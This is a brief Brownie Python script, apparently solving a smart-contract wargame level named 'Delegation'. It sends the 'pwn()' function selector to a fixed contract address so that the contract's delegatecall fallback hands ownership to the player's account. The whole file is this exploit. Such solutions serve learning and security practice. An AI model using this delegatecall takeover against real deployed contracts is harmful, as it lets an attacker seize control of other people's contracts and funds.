from brownie import accounts, config, web3, Delegation 

def main():
    contract = '0x9dD1bDa07B3Ba25362B7A8A42d7eE17A128769B3'   
    player = accounts.add(config['wallets']['from_key'])

    # Get the object so you can interact it using brownie
    delegation_contract = Delegation.at(contract)

    pwn = web3.sha3(text="pwn()")

    player.transfer(delegation_contract,data = pwn)
